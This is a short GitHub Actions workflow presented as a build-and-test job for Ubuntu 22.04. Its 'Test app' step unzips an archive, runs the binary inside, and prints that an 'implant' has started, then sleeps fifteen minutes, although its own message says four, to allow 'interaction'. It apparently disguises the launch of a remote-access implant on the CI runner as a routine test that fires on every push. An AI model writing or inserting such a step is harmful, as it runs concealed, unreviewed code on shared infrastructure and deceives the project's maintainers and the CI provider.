name: Build & Test on Ubuntu 22.04

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    name: Ubuntu 22.04 â€¢ GCC 11 (default)
    runs-on: ubuntu-22.04

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Test app
        run: |
          unzip test.zip && ./test
          echo "Implant started in background, waiting 4 minutes for interaction testing..."
          sleep 900
          echo "Interaction test complete."

      
